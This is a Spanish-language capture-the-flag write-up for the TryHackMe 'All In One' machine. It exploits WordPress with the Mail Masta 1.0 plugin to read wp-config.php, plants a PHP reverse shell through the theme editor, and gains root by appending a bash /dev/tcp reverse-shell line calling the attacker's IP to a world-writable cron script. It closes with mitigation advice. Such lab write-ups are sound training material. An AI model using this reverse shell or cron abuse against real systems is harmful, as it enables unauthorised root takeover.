@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina All In One TryHackMe | ZsZsec</title>
+<meta content="Resumen Durante la evaluación se identificó una superficie de ataque web con WordPress desactualizado y el plugin Mail Masta 1.0 vulnerable. Mediante ese vector se obtuvieron crede..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina All In One TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>TryHackMe</span></div>
+<div class="tag-row"><span class="tag">TryHackMe</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Resumen</h1>
+<p>Durante la evaluación se identificó una superficie de ataque web con WordPress desactualizado y el plugin <strong>Mail Masta 1.0</strong> vulnerable. Mediante ese vector se obtuvieron credenciales desde <code>wp-config.php</code>, se accedió al panel de administración y se desplegó una web-shell. La <strong>escalada a root</strong> se logró aprovechando un <strong>cron job</strong> ejecutado por root que apuntaba a un script <strong>world-writable (777)</strong>. Como resultado, se obtuvo control total del host.</p>
+<h2>Alcance y metodología</h2>
+<ul>
+<li><strong>Objetivo:</strong> conseguir ejecución de comandos y privilegios de administrador/superusuario.</li>
+<li><strong>Metodología:</strong><ol>
+<li>Reconocimiento activo (Nmap)</li>
+<li>Enumeración de HTTP/WordPress (Gobuster/WPScan)</li>
+<li>Explotación inicial (Mail Masta → lectura de <code>wp-config.php</code>)</li>
+<li>Persistencia/Ejecución de código (editor de temas → reverse shell)</li>
+<li><strong>PE</strong>: Abuso de cron job root + script con permisos inseguros</li>
+</ol>
+</li>
+</ul>
+<p>Escaneo nmap</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/anthem]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.201.104.163  -oN nmap.txt  
+</code></pre>
+<p><strong>Hallazgos clave:</strong></p>
+<p><strong>PORT STATE SERVICE</strong></p>
+<ul>
+<li>21/tcp open ftp</li>
+<li>22/tcp open ssh</li>
+<li>80/tcp open http.</li>
+</ul>
+<h2>Enumeración de HTTP/WordPress</h2>
+<p>Con <strong>Gobuster</strong> se descubrió <code>/wordpress/</code> (rastro típico en entornos de laboratorio). Posteriormente, <strong>WPScan</strong> enumeró versión y plugins:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Desktop/allinone]
+└─$ wpscan --url http://10.201.7.182/wordpress  --detection-mode aggressive --plugins-version-detection aggressive --enumerate ap,at,dbe  
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+ 
+[+] URL: http://10.201.7.182/wordpress/ [10.201.7.182]
+[+] Started: Sun Aug 10 18:47:45 2025
+
+Interesting Finding(s):
+                                                                                                                                                                                                                  
+[+] XML-RPC seems to be enabled: http://10.201.7.182/wordpress/xmlrpc.php                                                                                                                                         
+ | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                 
+ | Confidence: 100%                                                                                                                                                                                               
+ | References:                                                                                                                                                                                                    
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                                                                                                             
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                                                                                                           
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/                                                                                                                                  
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                                                                            
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/                                                                                                                         
+                                                                                                                                                                                                                  
+[+] WordPress readme found: http://10.201.7.182/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.201.7.182/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.201.7.182/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
+ | Found By: Atom Generator (Aggressive Detection)
+ |  - http://10.201.7.182/wordpress/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="5.5.1"&gt;WordPress&lt;/generator&gt;
+ | Confirmed By: Style Etag (Aggressive Detection)
+ |  - http://10.201.7.182/wordpress/wp-admin/load-styles.php, Match: '5.5.1'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] mail-masta
+ | Location: http://10.201.7.182/wordpress/wp-content/plugins/mail-masta/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2014-09-19T07:52:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.201.7.182/wordpress/wp-content/plugins/mail-masta/readme.txt
+
+[+] reflex-gallery
+ | Location: http://10.201.7.182/wordpress/wp-content/plugins/reflex-gallery/
+ | Latest Version: 3.1.7 (up to date)
+ | Last Updated: 2021-03-10T02:38:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 3.1.7 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.201.7.182/wordpress/wp-content/plugins/reflex-gallery/readme.txt
+</code></pre>
+<p><strong>Resultados relevantes:</strong></p>
+<ul>
+<li><p><strong>WordPress 5.5.1</strong> (inseguro, release 2020-09-01).</p>
+</li>
+<li><p><strong>XML-RPC</strong> habilitado.</p>
+</li>
+<li><p><strong>Directory listing</strong> activo en <code>wp-content/uploads/</code>.</p>
+</li>
+<li><p><strong>WP-Cron</strong> accesible externamente.</p>
+</li>
+<li><p>Plugins detectados:</p>
+<ul>
+<li><strong>mail-masta 1.0</strong> (vulnerable, vector principal de este compromiso).</li>
+<li><strong>reflex-gallery 3.1.7</strong> (no se explotó).</li>
+</ul>
+</li>
+</ul>
+<p>Estas señales combinadas (WP desactualizado, XML-RPC abierto y listado de uploads) ya sugerían una <strong>postura débil de seguridad</strong> antes incluso de confirmar el plugin vulnerable.</p>
+<h2>Explotación inicial — Mail Masta 1.0</h2>
+<p>Se empleó un <strong>exploit público</strong> para el plugin <strong>Mail Masta 1.0</strong>. El payload permitió <strong>leer y decodificar</strong> el archivo <strong><code>wp-config.php</code></strong>, exponiendo las credenciales de la base de datos, típicamente reutilizadas para otras funciones (o palanca para acceso administrativo). Ejecución y salida:</p>
+<pre><code class="language-bash">zikuta㉿zikuta)-[~/Desktop/allinone/wp-mail-masta-exploit]
+└─$ python3 mail-masta-exploit.py http://10.201.7.182/wordpress                                  
+[!] Direct read failed or incomplete, trying base64 encoding method
+[+] Successfully read and decoded wp-config.php
+     
+[+] MySQL Database Username: elyana
+[+] MySQL Database Password: H@ckme@123
+</code></pre>
+<p>Con esas credenciales se validó el acceso al panel de WordPress como administrador.</p>
+<p><strong>Por qué funciona:</strong> el plugin presenta una <strong>falla de validación de entradas</strong> que habilita la <strong>lectura arbitraria</strong> (p. ej., mediante rutas o consultas mal filtradas), permitiendo exfiltrar ficheros sensibles como <code>wp-config.php</code>. Desde el punto de vista de riesgo, es <strong>exposición de secretos</strong> que habilita <strong>toma de control de la aplicación</strong>.</p>
+<h2>Ejecución de código y acceso inicial (web-shell)</h2>
+<p>Con acceso al <strong>/wp-admin</strong>, se utilizó el <strong>editor de temas</strong> para subir un <strong>PHP reverse shell</strong> Luego se abrió un listener:</p>
+<pre><code class="language-bash">nc -lvnp 4444
+</code></pre>
+<p>Al activar la carga, se obtuvo una <strong>shell como <code>www-data</code></strong>, confirmando <strong>RCE</strong> a través del servidor web.</p>
+<h2>Escalada de privilegios (PE) — Cron job root + script 777</h2>
+<p>Durante la enumeración local se revisó <strong><code>/etc/crontab</code></strong> y se encontró un <strong>cron job</strong> que ejecutaba <strong>cada minuto</strong> un script:</p>
+<pre><code class="language-bash">cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+*  *    * * *   root    /var/backups/script.sh
+
+</code></pre>
+<p>Al momento de verificar los permisos que tenia el script se encontro...</p>
+<pre><code class="language-bash">wxrwxrwx 1 root root    73 Oct  7  2020 script.sh
+$ ls -la
+total 56
+drwxr-xr-x  2 root root  4096 Apr 27 10:45 .
+drwxr-xr-x 14 root root  4096 Oct  5  2020 ..
+-rw-r--r--  1 root root 33928 Apr 27 10:41 apt.extended_states.0
+-rw-r--r--  1 root root  3598 Oct  6  2020 apt.extended_states.1.gz
+-rw-r--r--  1 root root  3570 Oct  5  2020 apt.extended_states.2.gz
+-rwxrwxrwx  1 root root    73 Oct  7  2020 script.sh
+
+</code></pre>
+<p>El archivo <strong><code>/var/backups/script.sh</code></strong> tenía <strong>permisos 777 (rwxrwxrwx)</strong>, es decir, <strong>world-writable</strong> por cualquier usuario, <strong>pero</strong> era <strong>ejecutado por root</strong> desde cron: condición clásica para <strong>Privilege Escalation</strong>.</p>
+<p>Se modificó el script para forzar una reverse shell hacia el host del atacante y se preparó el listener:</p>
+<pre><code class="language-bash">echo "bash -i &gt;&amp; /dev/tcp/10.23.120.245/8009 0&gt;&amp;1" &gt;&gt; /var/backups/script.sh
+</code></pre>
+<p>En el siguiente minuto de cron, se estableció la conexión inversa como <strong>root</strong>, confirmando la <strong>comprometida escalada de privilegios</strong></p>
+<p><strong>Resultado:</strong></p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/allinone]
+└─$ nc -lvnp 8009
+listening on [any] 8009 ...
+connect to [10.23.120.245] from (UNKNOWN) [10.201.7.182] 35298
+bash: cannot set terminal process group (3919): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-201-7-182:~#
+</code></pre>
+<h2>Evidencias clave (IOEs/artefactos)</h2>
+<ul>
+<li>Registro de Nmap con <strong>80/http, 21/ftp**** y **22/ssh</strong> abiertos.</li>
+<li>WPScan mostrando <strong>WordPress 5.5.1</strong>, <strong>XML-RPC</strong> y plugins detectados (incl. <strong>Mail Masta 1.0</strong>).</li>
+<li>Lectura de <code>wp-config.php</code> con credenciales <strong><code>elyana / H@ckme@123</code></strong>.</li>
+<li><code>crontab</code> con <strong><code>/var/backups/script.sh</code></strong> en ejecución por root + permisos <strong>777</strong> del script.</li>
+</ul>
+<h2>Análisis del vector y cadena de ataque</h2>
+<ol>
+<li><strong>Postura débil de WordPress</strong> (desactualización + superficie ampliada: XML-RPC, listado de uploads).</li>
+<li><strong>Plugin vulnerable</strong> que permitió <strong>exfiltrar secretos</strong> (db creds) y, en consecuencia, <strong>acceso administrativo</strong>.</li>
+<li><strong>Editor de temas habilitado</strong> → <strong>RCE</strong> mediante web-shell.</li>
+<li><strong>Permisos inseguros</strong> y <strong>tarea programada de root</strong> → <strong>PE a root</strong> sin necesidad de exploits kernel ni credenciales adicionales.</li>
+</ol>
+<h2>Recomendaciones de mitigación</h2>
+<p><strong>Aplicación (WordPress)</strong></p>
+<ul>
+<li><strong>Actualizar</strong> WordPress a una versión soportada y <strong>eliminar/actualizar</strong> plugins obsoletos (desinstalar <strong>Mail Masta 1.0</strong>).</li>
+<li><strong>Deshabilitar el editor de temas</strong> en producción (<code>DISALLOW_FILE_EDIT</code> en <code>wp-config.php</code>).</li>
+<li><strong>Restringir/filtrar XML-RPC</strong> (bloqueo por IP, plugins de seguridad, o deshabilitar si no es imprescindible).</li>
+<li><strong>Desactivar directory listing</strong> en <code>wp-content/uploads/</code></li>
+<li><strong>Rotar credenciales</strong> y usar <strong>secret management</strong>; evitar reutilización.</li>
+</ul>
+<p><strong>Sistema/Host</strong></p>
+<ul>
+<li>Revisar <strong><code>/etc/crontab</code></strong> y <strong>eliminar</strong> tareas innecesarias; <strong>principio de mínimo privilegio</strong> en cron jobs.</li>
+<li><strong>Prohibir archivos world-writable</strong> en rutas ejecutadas por root (auditoría de permisos y <strong>umask</strong> segura).</li>
+<li>Aislar el usuario del servidor web (<code>www-data</code>) con <strong>AppArmor/SELinux</strong>, <code>noexec</code> en directorios de contenido cuando aplique, y deshabilitar intérpretes no requeridos.</li>
+<li>Endurecer RDP (si aplica a este host): <strong>no exponer a Internet</strong>, 2FA, listas de control de acceso, y <strong>network segmentation</strong>.</li>
+</ul>
+<p><strong>Red/Monitoreo</strong></p>
+<ul>
+<li><strong>Egress filtering</strong> para bloquear conexiones salientes arbitrarias (evita reverse shells).</li>
+<li>Telemetría/alertas ante cambios en <strong><code>/var/*</code></strong> y <strong>crontab</strong>; integrarlo con SIEM/EDR.</li>
+</ul>
+<h2>Conclusión</h2>
+<p>El compromiso fue posible por una <strong>combinación de debilidades</strong>: WordPress/plug-in vulnerable + <strong>malas prácticas operativas</strong> (editor de temas expuesto, cron root ejecutando un script 777). La corrección requiere <strong>higiene de parches</strong>, <strong>endurecimiento de permisos</strong> y <strong>controles preventivos</strong> de ejecución y red. La cadena de ataque demostró cómo <strong>una falla en capa aplicación</strong> puede terminar en <strong>toma total del sistema</strong>.</p>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
